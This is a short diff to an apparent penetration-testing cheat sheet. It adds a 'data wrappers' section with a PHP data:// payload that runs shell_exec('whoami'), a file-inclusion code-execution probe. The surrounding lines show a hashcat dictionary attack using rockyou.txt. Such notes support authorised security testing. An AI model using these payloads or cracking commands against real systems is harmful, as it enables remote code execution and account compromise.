@@ -257,6 +257,12 @@ https://hashcat.net/wiki/doku.php?id=example_hashes
 hashcat -m <mode> -a 0 hashlist.txt /root/wordlist/rockyou.txt
 ```
 
+### data wrappers
+```
+data:text/plain,This is a test
+data:test/plain,<?php echo shell_exec("whoami") ?>
+```
+
 ### resources
 https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/exploiting-password-recovery-functionalities/  
 
